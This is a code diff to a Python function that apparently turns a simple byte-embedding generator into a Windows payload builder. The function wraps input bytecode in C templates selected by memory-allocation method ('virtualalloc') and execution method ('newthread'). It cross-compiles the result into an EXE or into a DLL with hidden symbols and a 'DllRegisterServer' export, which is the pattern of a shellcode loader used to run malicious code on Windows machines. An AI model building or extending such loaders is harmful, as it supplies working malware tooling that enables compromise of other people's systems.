@@ -1,63 +1,73 @@
 import os
 import subprocess
+import sys
+import uuid
+from jinja2 import Environment, FileSystemLoader
 
-# This C code template will be populated with the bytecode.
-C_SOURCE_TEMPLATE = """
-#include <stdio.h>
-#include <stdlib.h>
-
-// Bytecode from the input file is injected here.
-unsigned char bytecode[] = {{{byte_array_str}}};
-unsigned int bytecode_len = sizeof(bytecode);
-
-// This is the main function of the final Windows executable.
-// It simply writes the embedded bytecode to a file.
-int main() {{
-    const char* filename = "{output_filename}";
-    FILE *fp = fopen(filename, "wb");
-    if (fp == NULL) {{
-        return 1; // Exit with an error code if file creation fails.
-    }}
-    fwrite(bytecode, 1, bytecode_len, fp);
-    fclose(fp);
-    return 0; // Success
-}}
-"""
-
-def encode(file_content_bytes, original_filename):
+def encode(input_filepath, original_filename, options):
     """
-    Embeds bytecode into a C source file and cross-compiles it into a
-    Windows PE32+ executable.
-    The final artifact of this generator is the compiled .exe file itself.
+    Dynamically generates and compiles a C program based on user-selected options.
     """
-    # 1. Prepare data for the C template
-    byte_array_string = ", ".join([f"0x{byte:02x}" for byte in file_content_bytes])
-    base_name, _ = os.path.splitext(original_filename)
-    final_output_filename = f"{base_name}.embedded"
+    print(f"INFO: Starting Windows C embedder with options: {options}")
 
-    c_source_code = C_SOURCE_TEMPLATE.format(
-        byte_array_str=byte_array_string,
-        output_filename=final_output_filename
+    with open(input_filepath, "rb") as f:
+        bytecode = f.read()
+    bytecode_array_str = ", ".join([f"0x{byte:02x}" for byte in bytecode])
+
+    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
+    env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
+    template = env.get_template('base.c.j2')
+
+    c_source_code = template.render(
+        bytecode_array=bytecode_array_str,
+        allocation_partial=f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
+        execution_partial=f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
+        export_name=options.get('export_name', 'DllRegisterServer'),
+        output_format=options.get('output_format', 'exe')
     )
 
-    # 2. Write the C source to a temporary file in the pod
-    c_source_filename = "temp_builder.c"
-    with open(c_source_filename, "w") as f:
+    temp_c_filename = f"{uuid.uuid4()}.c"
+    temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
+    with open(temp_c_filepath, "w") as f:
         f.write(c_source_code)
 
-    # 3. Cross-compile for Windows using the MinGW-w64 toolchain
-    compiled_binary_name = f"{base_name}.exe"
-    # This is the command for the 64-bit Windows cross-compiler
-    compiler_command = ["x86_64-w64-mingw32-gcc", c_source_filename, "-o", compiled_binary_name]
+    output_ext = options.get('output_format', 'exe')
+    base_name, _ = os.path.splitext(original_filename)
+    output_artifact_filename = f"{base_name}.{output_ext}"
     
-    print(f"Cross-compiling {c_source_filename} for Windows...")
+    compiler_command = ["x86_64-w64-mingw32-gcc", "-O2"]
+    if options.get('debug_mode') == 'true':
+        compiler_command.append("-DDEBUG")
+    
+    temp_def_filepath = None
+    if output_ext == 'dll':
+        compiler_command.append("-shared")
+        compiler_command.append("-fvisibility=hidden")
+        compiler_command.append("-lkernel32")
+        
+        export_name = options.get('export_name', 'DllRegisterServer')
+        def_content = f"EXPORTS\n    {export_name}"
+        
+        temp_def_filename = f"{uuid.uuid4()}.def"
+        temp_def_filepath = os.path.join('/tmp/uploads', temp_def_filename)
+        with open(temp_def_filepath, "w") as f_def:
+            f_def.write(def_content)
+            
+        compiler_command.append(temp_def_filename)
+
+    compiler_command.extend([temp_c_filename, "-o", output_artifact_filename])
+
+    print(f"INFO: Compiling with command: {' '.join(compiler_command)}")
     try:
-        subprocess.run(compiler_command, check=True, capture_output=True, text=True)
-        print(f"Compilation successful. Output: {compiled_binary_name}")
+        subprocess.run(compiler_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
+        print(f"INFO: Compilation successful. Artifact: {output_artifact_filename}")
     except subprocess.CalledProcessError as e:
-        print(f"ERROR: Cross-compilation failed. Stderr: {e.stderr}")
-        raise Exception(f"C cross-compilation failed: {e.stderr}")
+        print(f"ERROR: Compilation failed. Stderr: {e.stderr}", file=sys.stderr)
+        raise Exception(f"C compilation failed: {e.stderr}")
+    finally:
+        if os.path.exists(temp_c_filepath):
+            os.remove(temp_c_filepath)
+        if temp_def_filepath and os.path.exists(temp_def_filepath):
+            os.remove(temp_def_filepath)
 
-    # 4. Return the name of the compiled executable, which is our final artifact.
-    return compiled_binary_name
-
+    return output_artifact_filename
